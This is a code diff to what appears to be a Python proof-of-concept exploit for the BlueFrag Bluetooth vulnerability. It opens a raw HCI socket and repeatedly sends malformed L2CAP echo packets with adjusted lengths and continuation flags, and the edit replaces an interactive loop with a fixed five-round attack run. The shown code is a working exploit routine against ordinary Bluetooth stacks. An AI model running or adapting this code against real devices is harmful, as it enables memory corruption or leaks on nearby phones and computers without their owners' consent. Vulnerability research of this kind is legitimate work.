@@ -41,7 +41,7 @@ def recv_hci():
 hci = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
 hci.setsockopt(socket.SOL_HCI, socket.HCI_DATA_DIR,1)
 hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00')
-hci.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+#hci.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 hci.bind((0,))
 start_new_thread(recv_hci, ())
 
@@ -80,21 +80,22 @@ if len(sys.argv) > 3:
 else:
     src_l = 70
     dst_l = 70
-
+ 
 #a = raw_input("Check socket")
-a = 1
-while a:
-	echo = False
-	send_echo_hci(0, "A"*(32))
-	i = 1
-	while not echo:
-	    send_echo_hci(i  , "A"*(dst_l), l2cap_len_adj=2)
-	    send_echo_hci(i+1, "A"*(src_l), continuation_flags=1)
-	    time.sleep(0.1)
+a = 0
+while a < 5:
+    echo = False
+    send_echo_hci(0, "A"*(32))
+    i = 1
+    while not echo:
+        send_echo_hci(i  , "A"*(dst_l), l2cap_len_adj=2)
+        send_echo_hci(i+1, "A"*(src_l), continuation_flags=1)
+        time.sleep(0.1)
 
-	    i = (i+1) % 250
-	    print "INQ: %d", i
-	a = int(raw_input("Continue?"))
+        i = (i+1) % 250
+        print "INQ: %d", i
+    a += 1
+    time.sleep(3)
 
 if len(sys.argv) > 4:
 	os.system("sudo lsof -u root > ~/BlueFrag_PoC/logs-06-06/" + str(debug_iter) + "-lsof-all.txt")
